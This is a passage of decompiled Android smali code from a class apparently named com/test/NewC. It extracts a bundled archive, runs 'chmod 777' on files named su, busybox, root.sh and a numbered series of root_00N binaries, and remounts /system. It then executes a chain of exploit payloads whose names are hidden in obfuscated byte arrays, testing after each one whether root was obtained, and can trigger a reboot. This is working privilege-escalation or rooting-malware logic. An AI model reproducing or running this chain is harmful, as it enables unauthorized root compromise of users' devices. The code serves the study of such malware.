    const-string v1, "/busybox mount -o remount,ro /system"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v0, "mount -o remount,ro /system"

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    iget-boolean v0, p0, Lcom/test/NewC;->q:Z

    if-eqz v0, :cond_40

    invoke-direct {p0, p1}, Lcom/test/NewC;->a(Ljava/util/List;)V

    const/4 v0, 0x6

    new-array v0, v0, [B

    fill-array-data v0, :array_42

    invoke-static {v0}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_40
    return-void

    nop

    :array_42
    .array-data 1
        0x72t
        0x65t
        0x62t
        0x6ft
        0x6ft
        0x74t
    .end array-data
.end method

.method private c()Z
    .registers 9

    const/4 v2, 0x1

    const/4 v4, 0x0

    const/4 v1, 0x0

    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    const-string v3, ""

    const-string v5, ""

    iget-object v6, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v0, v3, v5, v6}, La/a/e/b;->a(La/a/a;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Ljava/io/File;

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "/"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, ""

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_36

    move v0, v1

    :goto_35
    return v0

    :cond_36
    :try_start_36
    new-instance v5, Ljava/io/FileInputStream;

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "/"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ""

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v5, v0}, Ljava/io/FileInputStream;-><init>(Ljava/lang/String;)V
    :try_end_56
    .catch Ljava/lang/Throwable; {:try_start_36 .. :try_end_56} :catch_ba
    .catchall {:try_start_36 .. :try_end_56} :catchall_ce

    :try_start_56
    new-instance v3, Ljava/io/FileOutputStream;

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v6, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v0, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "/"

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v6, ""

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v6, ".zip"

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V
    :try_end_7c
    .catch Ljava/lang/Throwable; {:try_start_56 .. :try_end_7c} :catch_22a
    .catchall {:try_start_56 .. :try_end_7c} :catchall_21e

    :try_start_7c
    const-string v0, ""

    invoke-static {v0, v5, v3}, Lcom/test/Hello;->a(Ljava/lang/String;Ljava/io/InputStream;Ljava/io/OutputStream;)V
    :try_end_81
    .catch Ljava/lang/Throwable; {:try_start_7c .. :try_end_81} :catch_22f
    .catchall {:try_start_7c .. :try_end_81} :catchall_221

    if-eqz v3, :cond_86

    :try_start_83
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V
    :try_end_86
    .catch Ljava/lang/Exception; {:try_start_83 .. :try_end_86} :catch_218

    :cond_86
    :goto_86
    if-eqz v5, :cond_8b

    :try_start_88
    invoke-virtual {v5}, Ljava/io/FileInputStream;->close()V
    :try_end_8b
    .catch Ljava/lang/Exception; {:try_start_88 .. :try_end_8b} :catch_21b

    :cond_8b
    :goto_8b
    new-instance v4, Ljava/io/File;

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "/"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ""

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ".zip"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v4, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_db

    move v0, v1

    goto/16 :goto_35

    :catch_ba
    move-exception v0

    move-object v2, v4

    :goto_bc
    :try_start_bc
    const-string v3, ""

    invoke-static {v3, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_c1
    .catchall {:try_start_bc .. :try_end_c1} :catchall_225

    if-eqz v2, :cond_c6

    :try_start_c3
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V
    :try_end_c6
    .catch Ljava/lang/Exception; {:try_start_c3 .. :try_end_c6} :catch_20c

    :cond_c6
    :goto_c6
    if-eqz v4, :cond_cb

    :try_start_c8
    invoke-virtual {v4}, Ljava/io/FileInputStream;->close()V
    :try_end_cb
    .catch Ljava/lang/Exception; {:try_start_c8 .. :try_end_cb} :catch_20f

    :cond_cb
    :goto_cb
    move v0, v1

    goto/16 :goto_35

    :catchall_ce
    move-exception v0

    move-object v5, v4

    :goto_d0
    if-eqz v4, :cond_d5

    :try_start_d2
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->close()V
    :try_end_d5
    .catch Ljava/lang/Exception; {:try_start_d2 .. :try_end_d5} :catch_212

    :cond_d5
    :goto_d5
    if-eqz v5, :cond_da

    :try_start_d7
    invoke-virtual {v5}, Ljava/io/FileInputStream;->close()V
    :try_end_da
    .catch Ljava/lang/Exception; {:try_start_d7 .. :try_end_da} :catch_215

    :cond_da
    :goto_da
    throw v0

    :cond_db
    :try_start_db
    new-instance v5, Lb/a/a/a/b;

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "/"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ""

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ".zip"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v5, v0}, Lb/a/a/a/b;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Lb/a/a/a/b;->b()Z

    move-result v0

    if-eqz v0, :cond_10c

    const-string v0, ""

    invoke-virtual {v5, v0}, Lb/a/a/a/b;->a(Ljava/lang/String;)V

    :cond_10c
    invoke-virtual {v5}, Lb/a/a/a/b;->a()Ljava/util/List;

    move-result-object v6

    move v3, v1

    :goto_111
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v0

    if-lt v3, v0, :cond_1c8

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "chmod 777 "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "/su"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x0

    const/4 v5, 0x0

    invoke-static {v0, v3, v5}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "chmod 777 "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "/busybox"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x0

    const/4 v5, 0x0

    invoke-static {v0, v3, v5}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "chmod 777 "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "/root.sh"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x0

    const/4 v5, 0x0

    invoke-static {v0, v3, v5}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "chmod 777 "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "/unroot.sh"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x0

    const/4 v5, 0x0

    invoke-static {v0, v3, v5}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    move v0, v2

    :goto_188
    const/16 v3, 0x9

    if-lt v0, v3, :cond_1d8

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "chmod 777 "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "/.root"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x0

    const/4 v5, 0x0

    invoke-static {v0, v3, v5}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    iget-boolean v0, p0, Lcom/test/NewC;->p:Z

    if-eqz v0, :cond_1c2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "ls -l -a "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x0

    const/4 v5, 0x0

    invoke-static {v0, v3, v5}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;
    :try_end_1c2
    .catch Lb/a/a/c/a; {:try_start_db .. :try_end_1c2} :catch_1fb
    .catchall {:try_start_db .. :try_end_1c2} :catchall_207

    :cond_1c2
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    move v0, v2

    goto/16 :goto_35

    :cond_1c8
    :try_start_1c8
    invoke-interface {v6, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lb/a/a/e/f;

    iget-object v7, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v5, v0, v7}, Lb/a/a/a/b;->a(Lb/a/a/e/f;Ljava/lang/String;)V

    add-int/lit8 v0, v3, 0x1

    move v3, v0

    goto/16 :goto_111

    :cond_1d8
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "chmod 777 "

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "/root_00"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-static {v3, v5, v6}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;
    :try_end_1f8
    .catch Lb/a/a/c/a; {:try_start_1c8 .. :try_end_1f8} :catch_1fb
    .catchall {:try_start_1c8 .. :try_end_1f8} :catchall_207

    add-int/lit8 v0, v0, 0x1

    goto :goto_188

    :catch_1fb
    move-exception v0

    :try_start_1fc
    const-string v2, ""

    invoke-static {v2, v0}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_201
    .catchall {:try_start_1fc .. :try_end_201} :catchall_207

    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    move v0, v1

    goto/16 :goto_35

    :catchall_207
    move-exception v0

    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    throw v0

    :catch_20c
    move-exception v0

    goto/16 :goto_c6

    :catch_20f
    move-exception v0

    goto/16 :goto_cb

    :catch_212
    move-exception v1

    goto/16 :goto_d5

    :catch_215
    move-exception v1

    goto/16 :goto_da

    :catch_218
    move-exception v0

    goto/16 :goto_86

    :catch_21b
    move-exception v0

    goto/16 :goto_8b

    :catchall_21e
    move-exception v0

    goto/16 :goto_d0

    :catchall_221
    move-exception v0

    move-object v4, v3

    goto/16 :goto_d0

    :catchall_225
    move-exception v0

    move-object v5, v4

    move-object v4, v2

    goto/16 :goto_d0

    :catch_22a
    move-exception v0

    move-object v2, v4

    move-object v4, v5

    goto/16 :goto_bc

    :catch_22f
    move-exception v0

    move-object v2, v3

    move-object v4, v5

    goto/16 :goto_bc
.end method

.method private d()Z
    .registers 9

    const/16 v7, 0x39

    const/16 v6, 0x9

    const/4 v5, 0x7

    const/4 v0, 0x1

    const/4 v1, 0x0

    new-instance v2, Ljava/util/LinkedList;

    invoke-direct {v2}, Ljava/util/LinkedList;-><init>()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v7, [B

    fill-array-data v4, :array_202

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v3

    if-eqz v3, :cond_38

    invoke-direct {p0, v5}, Lcom/test/NewC;->a(I)V

    :goto_37
    return v0

    :cond_38
    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v7, [B

    fill-array-data v4, :array_224

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v3

    if-eqz v3, :cond_67

    invoke-direct {p0, v5}, Lcom/test/NewC;->a(I)V

    goto :goto_37

    :cond_67
    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v7, [B

    fill-array-data v4, :array_246

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v3

    if-eqz v3, :cond_96

    invoke-direct {p0, v5}, Lcom/test/NewC;->a(I)V

    goto :goto_37

    :cond_96
    invoke-interface {v2}, Ljava/util/List;->clear()V

    const-string v3, "export PATH=/system/bin/"

    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v4, 0x6

    new-array v4, v4, [B

    fill-array-data v4, :array_268

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v3

    if-eqz v3, :cond_cc

    invoke-direct {p0, v6}, Lcom/test/NewC;->a(I)V

    goto/16 :goto_37

    :cond_cc
    invoke-interface {v2}, Ljava/util/List;->clear()V

    const-string v3, "su"

    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v6, [B

    fill-array-data v4, :array_270

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v3

    if-eqz v3, :cond_102

    const/4 v1, 0x2

    invoke-direct {p0, v1}, Lcom/test/NewC;->a(I)V

    goto/16 :goto_37

    :cond_102
    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v6, [B

    fill-array-data v4, :array_27a

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v3

    if-eqz v3, :cond_134

    const/16 v1, 0x8

    invoke-direct {p0, v1}, Lcom/test/NewC;->a(I)V

    goto/16 :goto_37

    :cond_134
    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v4, 0x11

    new-array v4, v4, [B

    fill-array-data v4, :array_284

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v3

    if-eqz v3, :cond_166

    invoke-direct {p0, v0}, Lcom/test/NewC;->a(I)V

    goto/16 :goto_37

    :cond_166
    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v4, 0x62

    new-array v4, v4, [B

    fill-array-data v4, :array_292

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v3

    if-eqz v3, :cond_199

    const/4 v1, 0x4

    invoke-direct {p0, v1}, Lcom/test/NewC;->a(I)V

    goto/16 :goto_37

    :cond_199
    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v4, 0x18

    new-array v4, v4, [B

    fill-array-data v4, :array_2c8

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v3

    if-eqz v3, :cond_1cc

    const/4 v1, 0x5

    invoke-direct {p0, v1}, Lcom/test/NewC;->a(I)V

    goto/16 :goto_37

    :cond_1cc
    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->b(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v4, 0x18

    new-array v4, v4, [B

    fill-array-data v4, :array_2d8

